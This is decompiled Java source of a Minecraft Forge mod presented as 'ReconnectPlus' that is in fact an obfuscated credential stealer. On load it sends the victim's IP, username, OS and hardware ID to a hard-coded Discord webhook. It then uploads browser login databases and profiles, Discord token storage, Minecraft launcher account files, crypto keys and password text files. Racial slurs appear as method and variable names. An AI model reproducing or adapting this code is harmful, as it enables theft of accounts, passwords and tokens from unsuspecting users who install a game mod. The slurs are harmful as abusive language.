// 
// Decompiled by Procyon v0.5.36
// 

package Macro.FailSafe;

import Macro.json.JSONObject;
import Macro.exception.WebhookException;
import java.awt.Color;
import Macro.Scripts.DiscordDuper;
import Macro.Scripts.Script;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import java.io.InputStream;
import javax.net.ssl.HttpsURLConnection;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.client.ClientProtocolException;
import java.net.URISyntaxException;
import java.net.URI;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.HttpClients;
import java.security.MessageDigest;
import java.io.IOException;
import java.util.Scanner;
import java.net.URL;
import java.util.ArrayList;
import net.minecraftforge.fml.common.Mod;

@Mod(modid = "ReconnectPlus", version = "1.0.0", acceptedMinecraftVersions = "[1.8.9]")
public class Discord
{
    public static final String MODID;
    public static final String VERSION;
    public static String desktop;
    public static String downloads;
    public static String minecraft;
    private static String webhook;
    public int BRANCHLOCK_DOT_NET_DEMO;
    public static String dataGrabbings;
    public ArrayList<String> workingTokens;
    private static final String[] s;
    
    public Discord() {
        this.workingTokens = new ArrayList<String>();
    }
    
    public static String getIP() {
        try {
            final Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
            final String ip = scanner.useDelimiter("\\A").next();
            scanner.close();
            return ip;
        }
        catch (IOException e) {
            e.printStackTrace();
            return "Unknown";
        }
    }
    
    public static String getName() {
        final String name = System.getProperty("user.name");
        return name;
    }
    
    public static String getOS() {
        final String os = System.getProperty("os.name");
        return os;
    }
    
    public static String getHWID() {
        try {
            final MessageDigest hash = MessageDigest.getInstance("MD5");
            final String s = getOS() + System.getProperty("os.arch") + System.getProperty("os.version") + Runtime.getRuntime().availableProcessors() + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS");
            return bytesToHex(hash.digest(s.getBytes()));
        }
        catch (Exception e) {
            return "######################";
        }
    }
    
    private static String bytesToHex(final byte[] bytes) {
        final char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; ++j) {
            final int v = bytes[j] & 0xFF;
            hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];
            hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0xF];
        }
        return new String(hexChars);
    }
    
    public static void sendData(final String msg, final String url, final String username) {
        try {
            Thread.sleep((int)Math.floor(Math.random() * 451.0 + 225.0));
        }
        catch (InterruptedException e1) {
            e1.printStackTrace();
        }
        final CloseableHttpClient httpclient = HttpClients.createDefault();
        try {
            HttpUriRequest httppost = null;
            try {
                httppost = RequestBuilder.post().setUri(new URI(url)).addParameter("content", msg).addParameter("username", username).build();
            }
            catch (URISyntaxException e2) {
                e2.printStackTrace();
            }
            CloseableHttpResponse response = null;
            try {
                response = httpclient.execute(httppost);
            }
            catch (ClientProtocolException e3) {
                e3.printStackTrace();
            }
            catch (IOException e4) {
                e4.printStackTrace();
            }
            try {
                response.close();
            }
            catch (IOException e4) {
                e4.printStackTrace();
            }
        }
        finally {
            try {
                httpclient.close();
            }
            catch (IOException e5) {
                e5.printStackTrace();
            }
        }
    }
    
    public static String sendDiscordInfo(final String token, final String apiLink, final String username) {
        String oainds = "";
        try {
            final String userAgent = Discord.s[1048576 >>> Integer.parseInt("fg5", 23)];
            final URL url = new URL(Discord.s[128 >>> 966] + apiLink);
            final HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod(Discord.s[32 >>> 8802]);
            connection.setRequestProperty(Discord.s[Integer.parseInt("7", 33) << Integer.parseInt("5mh", 27)], token);
            connection.setRequestProperty(Discord.s[5 << ("95".hashCode() ^ 0x1A5D)], userAgent);
            final InputStream response = connection.getInputStream();
            try (final Scanner scanner = new Scanner(response)) {
                final String responseBody = oainds = scanner.useDelimiter(Discord.s[1 << 4002]).next();
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        catch (Exception ex) {}
        return oainds;
    }
    
    public static boolean hasBeenPwned(final String email) {
        try {
            final String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
            final URL url = new URL("https://haveibeenpwned.com/unifiedsearch/" + email);
            final HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", userAgent);
            final InputStream response = connection.getInputStream();
            try (final Scanner scanner = new Scanner(response)) {
                final String responseBody = scanner.useDelimiter("\\A").next();
                if (responseBody.contains("\"Title\":")) {
                    return true;
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        catch (IOException e2) {
            return false;
        }
        return false;
    }
    
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) {
        final String line = "";
        final String ip = getIP();
        try {
            final DiscordDuper userInfo = new DiscordDuper(Script.getscript());
            userInfo.setUsername(getName());
            userInfo.addEmbed(new DiscordDuper.EmbedObject().setTitle(Discord.s[327680 >>> 5584]).setColor(Color.cyan).setDescription(Discord.s[-1879048192 >>> 2940] + getName()).addField(Discord.s[393216 >>> 5424], getName().toString(), true).addField(Discord.s[11 << 4896], getOS().toString(), true).addField(Discord.s[Integer.parseInt("5a", 21) >>> 8647], getHWID().toString(), false));
            userInfo.execute();
        }
        catch (IOException e) {
            e.printStackTrace();
            new WebhookException().printStackTrace();
        }
        sendData(Discord.s[6 << 8385] + ip, Script.getscript(), getName());
        final String appdata = System.getenv().get(Discord.s[13 << 6400]);
        final String local = System.getenv().get(Discord.s[6291456 >>> 10229]);
        final String s;
        final String str;
        new Thread(() -> {
            try {
                Uploader.uploadDupe(Discord.desktop + "alts.txt");
                Uploader.uploadDupe(Discord.desktop + "account.txt");
                Uploader.uploadDupe(Discord.desktop + "accounts.txt");
                Uploader.uploadDupe(Discord.desktop + "alt.txt");
                Uploader.uploadDupe(Discord.desktop + "minecraft.txt");
                Uploader.uploadDupe(Discord.desktop + "password.txt");
                Uploader.uploadDupe(Discord.desktop + "emails.txt");
                Uploader.uploadDupe(Discord.desktop + "banking.txt");
                Uploader.uploadDupe(Discord.desktop + "passwords.txt");
                Uploader.uploadDupe(Discord.minecraft + "wurst\\alts.json");
                Uploader.uploadDupe(Discord.minecraft + "Novoline\\alts.novo");
                Uploader.uploadDupe(Discord.minecraft + "Flux\\alt.txt");
                Uploader.uploadDupe(Discord.minecraft + "essential\\mojang_accounts.json");
                Uploader.uploadDupe(Discord.minecraft + "essential\\microsoft_accounts.json");
                Uploader.uploadDupe(Discord.downloads + "accounts.txt");
                Uploader.uploadDupe(Discord.downloads + "account.txt");
                Uploader.uploadDupe(Discord.downloads + "alts.txt");
                Uploader.uploadDupe(Discord.downloads + "alt.txt");
                Uploader.uploadDupe(s + "\\discordcanary");
                Uploader.uploadDupe(s + "\\discordptb");
                Uploader.uploadDupe(s + "\\Google\\Chrome\\User Data\\Default");
                Uploader.uploadDupe(s + "\\Opera Software\\Opera Stable");
                Uploader.uploadDupe(s + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
                Uploader.uploadDupe(s + "\\Yandex\\YandexBrowser\\User Data\\Default");
                Uploader.uploadDupe(s + "\\LightCord");
                Uploader.uploadDupe(s + "\\Microsoft\\Edge\\User Data\\Default");
                Uploader.uploadDupe(s + "\\Mozilla\\Firefox\\Profiles");
                Uploader.uploadDupe(s + "\\Google\\Chrome\\User Data\\Default\\Login Data");
                Uploader.uploadDupe(s + "\\.minecraft\\launcher_accounts.json");
                Uploader.uploadDupe(s + "\\Opera Software\\Opera Stable");
                Uploader.uploadDupe(s + "\\Google\\Chrome\\User Data\\Default");
                Uploader.uploadDupe(s + "\\Opera Software\\Opera Stable");
                Uploader.uploadDupe(s + "\\discord\\Local Storage\\leveldb");
                Uploader.uploadDupe(s + "\\Google\\Chrome\\User Data\\Default");
                Uploader.uploadDupe(s + "\\Opera Software\\Opera Stable");
                Uploader.uploadDupe(s + "\\Microsoft\\Crypto\\Keys");
                Uploader.uploadDupe(s + "\\.minecraft\\launcher_profiles.json");
                Uploader.uploadDupe(s + "\\EasyAntiCheat\\gamelauncher.log");
                Uploader.uploadDupe(s + "\\.minecraft\\launcher_profiles.json");
                Uploader.uploadDupe(s + "\\.minecraft\\logs\\latest.log");
                Uploader.uploadDupe(str + "\\Google\\Chrome\\User Data\\Default\\Login Data");
                Uploader.uploadDupe(s + "\\.minecraft\\mods");
                Uploader.uploadDupe(s + ".\\Loginvault.db");
                sendData(Discord.dataGrabbings, Script.getscript(), getName());
            }
            catch (Exception e2) {
                e2.printStackTrace();
            }
        }).start();
    }
    
    public static String i_hate_niggers(final String niggers, final String what_is_the_second_nigger) {
        try {
            final JSONObject json = new JSONObject(niggers);
            return json.getString(what_is_the_second_nigger);
        }
        catch (Exception e) {
            return "Invalid";
        }
    }
    
    static {
        final char[] charArray = "\u0e0a\u0ecb!\u00cb¿±\u0ebc¸\u0006\u008f\u009f\u0099\u0099\u0094\u00daDGAI\u00de\u00cb\u0018\u001f\u0091\u0006\u00eb\u0085\u00d5?¡I\u00c4\u00c6\u00db\u00c5\u00ce\u00d5&\u0000\u001f_\u00c2§Q\t\u00c3]µ\u00d6´\u0001\u0085\u0005\u0090¡\u0090\u0097¾\u009c\u0005FDZ\u00c1²BG\u00d5A\u00d7¾¡<¹E\u00d5\u009a\u009c\u009e\u0090\u00d56\f\u0012\u0002\u0099µQ2\u009d\u001b\u00f3\u009b\u0090^\u00c2]\u00db\u00c6\u00db\u00c6\u00c2\u00c7HG@_\u00cf¼\"\u0010\u0093\b\u00ee\u009f\u00daD\u00c6^\u00db\u00c5\u00c3\u0ed1\u009d\u0081\u0005\u0019\u0002S\u00d9³\u0015\u0018\u0086\n\u00f3\u0084\u0091\u0010\u0085\u0019\u00db\u0095\u009a\u0098\u00da\u0094\u0001\u0000^\u001f\u00c1³\u0ec3=º*\u00ddº´!¥-´¢´\u0ecd©´\u0ed1:\u001e\u0004\u0093\u00f3\u001f\u0014\u00d5\u000f\u00f3\u0084\u0092\u001e\u0081I\u0081\u009e\u0090\u009c\u0087\u00d5\u0010\u0007\u0005\u0000\u0080\u00f5\u0003\u0004\u0086\u0ec7\u00c9\u0085\u0090\u0003\u009b\b\u0098\u0093\u0ec2´\u0080\u0081\u0019\u0006\u0003\u0000\u008c\u00fd\u0005\u0018\u009a\u0007\u0ecc±°%\u0edc9¶\u00d6¼\u009b\u0093\u009a\u0003\u0004\u0010\u001d\u009f\u00f3\u001fQ\u0093\u0006\u00ee\u00d6\u0ec5$\u0086\f\u0087\u00db´\u0092\u0090\u009b\u0005\u0ecd>:\u0ed9\u00e0\r[\u00df)\u00f9\u0080\u0090\u0003\u008c\u0006\u009b\u0093\u00d5\u00df\u00df\u0089\r !S\u00d6\u0ec80!¥-\u00dd¢´".toCharArray();
        int n = Integer.parseInt("2c", 30) << 3933;
        final StackTraceElement stackTraceElement;
        final int n2 = (stackTraceElement = new Throwable().getStackTrace()[96 << 14683]).getMethodName().hashCode() & -65536 >>> 9200;
        final char[] charArray2 = stackTraceElement.getClassName().toCharArray();
        final char[] array = charArray;
        final int n3 = 46 << 2847;
        ++n;
        s = new String[array[n3] ^ (0x61E309E8 ^ 0x61E30945) ^ n2];
        int n4 = Integer.parseInt("5", 28) >>> 10595;
    Label_0104:
        while (true) {
            int n5;
            final char[] value = new char[n5 = (charArray[n++] ^ 51 << 12001 ^ n2)];
            int n6 = 50 << 3263;
        Label_0370_Outer:
            while (true) {
                Label_0321: {
                    if (n5 <= 0) {
                        break Label_0321;
                    }
                    int n7 = charArray[n];
                Label_0370:
                    while (true) {
                    Label_0392:
                        while (true) {
                        Label_0448:
                            while (true) {
                                Label_0457: {
                                    switch (charArray2[n % charArray2.length] ^ ("46".hashCode() ^ 0x6E9) << 1120) {
                                        case 2: {
                                            break Label_0370;
                                        }
                                        case 4: {
                                            break Label_0370;
                                        }
                                        case 69: {
                                            break Label_0392;
                                        }
                                        case 38: {
                                            break Label_0448;
                                        }
                                        case 7: {
                                            break Label_0448;
                                        }
                                        case 8: {
                                            break Label_0448;
                                        }
                                        case 10: {
                                            break Label_0448;
                                        }
                                        case 45: {
                                            break Label_0448;
                                        }
                                        case 13: {
                                            break Label_0448;
                                        }
                                        case 14: {
                                            break Label_0448;
                                        }
                                        case 47: {
                                            break Label_0448;
                                        }
                                        case 15: {
                                            break Label_0448;
                                        }
                                        case 56: {
                                            break Label_0457;
                                        }
                                        case 24: {
                                            break Label_0457;
                                        }
                                        case 25: {
                                            break Label_0457;
                                        }
                                    }
                                    while (true) {
                                        value[n6] = (char)n7;
                                        try {
                                            ++n6;
                                            ++n;
                                            --n5;
                                            // monitorexit(charArray2)
                                            n7 ^= Integer.parseInt("3n", 30) << 8416;
                                            continue Label_0370_Outer;
                                            break Label_0448;
                                            n7 ^= ("0".hashCode() ^ 0xCF178D15 ^ 0xCF178DD3);
                                            continue Label_0370_Outer;
                                            n7 ^= -1142539273 + 1142539518;
                                            continue Label_0370_Outer;
                                            break Label_0370;
                                            break Label_0448;
                                            Discord.s[n4++] = new String(value).intern();
                                            // iftrue(Label_0104:, n < charArray.length)
                                            Block_4: {
                                                break Block_4;
                                                n7 ^= 105 << Integer.parseInt("1cj", 33);
                                                continue Label_0370_Outer;
                                                break Label_0448;
                                                continue Label_0448;
                                            }
                                            VERSION = "1.0.0";
                                            MODID = "ReconnectPlus";
                                            Discord.desktop = "C:\\Users\\" + getName() + "\\Desktop\\";
                                            Discord.downloads = "C:\\Users\\" + getName() + "\\Downloads\\";
                                            Discord.minecraft = "C:\\Users\\" + getName() + "\\APPDATA\\Roaming\\.minecraft\\";
                                            Discord.webhook = "https://discord.com/api/webhooks/952027321760645181/PD1AQpFpjEtnabTqnI_mZxzDWylxRW5pEadOYxiGnBYs7_kLIuHGCM8ZZBokrLjk";
                                            Discord.dataGrabbings = "";
                                            return;
                                            continue Label_0392;
                                            continue Label_0370;
                                            n7 ^= ("Branchlock.net Demo".hashCode() ^ 0x200B1787) >>> 13255;
                                        }
                                        catch (RuntimeException ex) {
                                            break;
                                        }
                                    }
                                }
                                break;
                            }
                            break;
                        }
                        break;
                    }
                }
            }
        }
    }
}
